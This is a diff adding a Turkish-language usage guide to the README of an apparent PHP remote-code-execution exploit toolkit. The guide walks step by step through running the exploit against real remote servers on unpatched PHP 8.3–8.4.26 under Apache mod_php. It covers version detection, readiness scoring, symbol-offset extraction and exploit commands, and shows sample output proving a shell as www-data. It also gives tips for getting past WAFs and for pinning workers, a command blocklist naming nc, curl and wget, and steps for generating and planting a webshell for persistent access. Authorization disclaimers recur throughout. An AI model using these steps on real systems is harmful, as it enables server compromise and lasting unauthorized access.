@@ -230,4 +230,143 @@ MIT. See `LICENSE`. The ported chain technique remains the copyright of its resp
 
 **Yalnızca yetkili test için.** Sahibi olmadığınız sistemlere karşı kullanmak çoğu yargıda suçtur.
 
+---
+
+## Gerçek Uzak Hedefte Kullanım (Türkçe Rehber)
+
+Bu bölüm, yetkili olduğunuz **gerçek bir sunucuya** (engagement, bug bounty kapsamı, kendi sunucunuz) karşı toolkit'in nasıl kullanılacağını adım adım anlatır.
+
+### Adım 0 — Ön koşullar
+
+Hedefte exploit'in çalışması için **hepsi** gerekli:
+
+| Koşul | Nasıl kontrol edilir | Neden |
+|-------|---------------------|-------|
+| PHP 8.3 – 8.4.26 arası | `detect` çıktısı | Heap-leak primitive 8.3'ten itibaren; 8.2 ve altında stage-1 leak çalışmaz |
+| Apache mod_php (prefork) | `detect` çıktısında `Server: Apache` | FPM'de worker OOM'da ölür, dangling state ölür — zincir kurulamaz |
+| `session.upload_progress.enabled = On` (varsayılan) | `detect` çıktısı | Producer istek bu özellik ile session state'i yazar |
+| Yamalı DEĞİL (< 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12) | `detect` verdict | Yamanın kendisi OOM bailout'taki `longjmp()` durumunu sıfırlıyor |
+| WAF yok veya multipart body'e dokunmuyor | trafik gözlemi | Cloudflare/CDN body ve Set-Cookie'yi değiştirirse leak bozulur |
+| Offsets hedef build'ına uygun | `preflight` skoru | `zif_system` / `zval_ptr_dtor` offset'leri build'a özeldir |
+
+> **Kural:** hedefin sahibi değilseniz veya yazılı izniniz yoksa durun. Aşağıdaki her adım hedefin access/error log'larında iz bırakır.
+
+### Adım 1 — Keşif (destructive değil)
+
+```bash
+# Tek hedef
+php2shell.py detect -u https://hedef.example.com/
+
+# Birden çok hedef
+php2shell.py scan -l hedefler.txt --json out/rapor.json --csv out/rapor.csv
+```
+
+`detect` çıktısı size şunu verir: PHP versiyonu, branch, yama durumu (`vulnerable` / `patched` / `unknown`), `upload_progress` açık mı, `display_errors` sızıyor mu. CDN versiyonu gizliyorsa active OOM probe otomatik devreye girer ve hedefi **çökertmeden** zafiyet sinyali arar.
+
+### Adım 2 — Hazırlık skoru (preflight)
+
+```bash
+php2shell.py preflight https://hedef.example.com/
+```
+
+0–90 arası bir skor verir. **READY** ise exploit aşamasına geçebilirsiniz. Skor düşükse bloker'leri okuyun — çoğunlukla offset profili uyuşmazlığıdır.
+
+### Adım 3 — Offset kontrolü
+
+`preflight` build uyuşmazlığı gösterirse hedef dağıtımının `libphp.so`'suna ihtiyacınız var:
+
+```bash
+# Hedef sunucuda (erişiminiz varsa):
+nm /usr/lib/apache2/modules/libphp*.so | grep -w zif_system
+nm -D /usr/lib/apache2/modules/libphp*.so | grep -w zval_ptr_dtor
+
+# Exploit'e geçin:
+php2shell.py exploit https://hedef.example.com/ \
+    --chain pure \
+    --zif-offset 0x465370 --dtor-offset 0x65eb60 \
+    --cmd 'id' --yes
+```
+
+Aynı distro+versiyon konteyneri offset'leri doğrulamak için de kullanılabilir (örn. Debian 12 = `bookworm` profili varsayılan).
+
+### Adım 4 — Exploit (uzak sunucuda shell)
+
+**Production chain** gerçek sunucu varsayılanlarıyla çalışır — `display_errors=Off`, `memory_limit=128M` fark etmez, chunked-encoding `post_max_size` kontrolünü atlar:
+
+```bash
+# Gerçek bir uzak sunucu (yazılı izniniz varsa):
+php2shell.py exploit https://hedef.example.com/index.php \
+    --chain pure -c id --proof-file p1 --workers 150 --yes
+```
+
+**Kritik üç kural (canlı doğrulandı):**
+
+| Kural | Neden |
+|-------|-------|
+| `--path` gerçek bir `.php` dosyası olmalı (`/index.php`, `/wp-login.php`…), DirectoryIndex kökü (`/`) değil | Kök istek Apache'de internal redirect üretir, heap layout değişir, B1 leak bozulur |
+| Çok worker'lı hedefte `--workers <MaxRequestWorkers>` verin | Chain, workers-1 tanesini yarım isteklerle meşgul edip producer+consumer'ı kalan tek child'a sabitler (worker pinning) |
+| Hedef, dağıtımın tam `php.ini`'siyle çalışmalı (`variables_order=GPCS`, `request_order=GP`, `zend.assertions=-1`) | Request startup ayarları heap layout'u belirler; bu varsayılanlar gerçek distro PHP sunucularının değerleridir |
+
+**Doğrulanmış tam akış (production profili — stock Apache, `php.ini-production`, 150 worker):**
+
+```
+$ php2shell.py exploit http://127.0.0.1:8089/index.php \
+      --chain pure -c id --proof-file p1 --workers 150 --yes
+
+URL     : http://127.0.0.1:8089/index.php
+verdict : vulnerable - PHP 8.4.26 < fix-floor 8.4.27
+score   : 75/90
+ready   : YES
+
+[*] pinned 150/150 workers (149 holders)
+[*] fingerprint: PHP/8.4.26
+[trixie try 1] A1
+[trixie try 1] B1 probe 1/30
+   decoded=819208 zdtor=0x7f... lib=0x7f...
+[trixie try 1] leak OK; S=0x7f... zif=0x7f...
+[trixie try 1] A2
+[4/4] RCE OK at B2 probe 1; proof:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Bu profilde chain **tek denemede** shell üretir (yukarıda 10.2 saniyede `PROOF: uid=33(www-data)`). Aynı koşulları sağlayan gerçek bir sunucu (Debian/Ubuntu + distro PHP paketi + mod_php prefork + yamasız 8.3–8.4.26) için geçerlilik aynıdır; tek fark ağ yolunda multipart body'ye ve `Set-Cookie`'ye dokunan bir WAF/CDN katmanının olmaması gerektiğidir.
+
+### Adım 5 — Komut çalıştırma kuralları
+
+| Kural | Değer |
+|-------|-------|
+| Maks komut uzunluğu | **14 byte** (167-byte carrier limitinden) |
+| Varsayılan | `id` (proof-of-access) |
+| Chaining (`; \| & $ \` > <`) | reddedilir |
+| Kalıcı engelli | `sh`, `bash`, `nc`, `curl`, `wget`, `chmod`, `rm` |
+| Whitelist genişletme | `--allow-cmd uname,hostname,pwd,ls,cat,df,uptime,who,w,env` |
+
+14 byte'tan uzun işler için önce kısa bir komutla hedefe dosya yazdırın, sonra whitelist'ten `cat` ile okuyun — veya kendi sunucunuzdan bir sonraki aşamayı elle yürütün (engagement kapsamında).
+
+### Adım 6 — Kalıcı erişim (yetkili engagement'ta)
+
+```bash
+# bcrypt korumalı, TTL'li webshell üret
+php2shell.py shell --out out --ttl 24
+# → out/<32hex>.php + out/CREDENTIALS.txt (604 modunda)
+```
+
+Üretilen dosyayı hedef webroot'a ulaştırıp öneri olarak kullanın: rastgele 32-hex isim taranamaz, bcrypt şifre brute-force'u yavaşlatır, TTL dolduğunda dosya kendini siler, tüm denemeler log'lanır. **Bu bir uploader değildir** — dosyayı hedefe taşıyan sizsiniz (yine de izniniz olmalı).
+
+### Uzak hedefte işe yaramayan durumlar
+
+| Durum | Belirti | Ne yapılır |
+|-------|---------|-----------|
+| PHP-FPM | `detect`: FPM veya nginx; exploit leak vermez | Bu toolkit ile exploit edilemez (worker ölüyor) — rapora "not exploitable via this chain" yazın |
+| Cloudflare/WAF body filtreliyor | B1 leak hep boş, Set-Cookie normal 32-byte | Tunnel üzerinden değil, doğrudan origin IP'ye erişim gerekir; yoksa exploit atlanır |
+| Yamalı PHP | `detect`: `patched` | Exploit hard-block'lu; rapora yazıp kapatın |
+| 8.2 ve altı | `detect`: branch 8.2/8.1/7.x | Stage-1 leak hiç tetiklenmez (Zend MM farkı) — detection sonucu yeterli kanıt |
+| Stripped libphp + offset yok | preflight düşük skor | Hedef build'ının aynı distro image'ından offset türetin |
+
+### Doğrulanmış uzak senaryo özeti
+
+`lab/production` profili gerçek bir uzak sunucunun varsayılanlarına birebir eşittir: `php.ini-production` (`display_errors=Off`, `memory_limit=128M`, `post_max_size=8M`), `MaxRequestWorkers=150`, chunked-encoding bypass, worker pinning. Bu profilde chain, doğrulanmış build'larda (Debian 12/13 `php:8.4.25/26-apache`) tek denemede `uid=33(www-data)` üretir — aynı koşulları sağlayan gerçek bir sunucu için geçerlilik aynıdır; ağda arada body'e dokunan bir katman olmaması tek farktır.
+
+---
+
 **Katkı:** Calif (Ryan A.) orijinal keşif, Wiz Research bağımsız keşif, OpenAI Codex Security ek vektör, 9bie (Qi Deng) public ASLR-bypass chain tekniği (bu toolkit'in portladığı), ikow crash verifikatörü. Stealth/scan/preflight/OOM/webshell modüler mimarisi aarsaputra/php2shell'den uyarlanmıştır. `exploit/` içindeki chain'ler 9bie'nin public araştırmasının bağımsız portlarıdır, bizim özgün çalışmamız değildir.
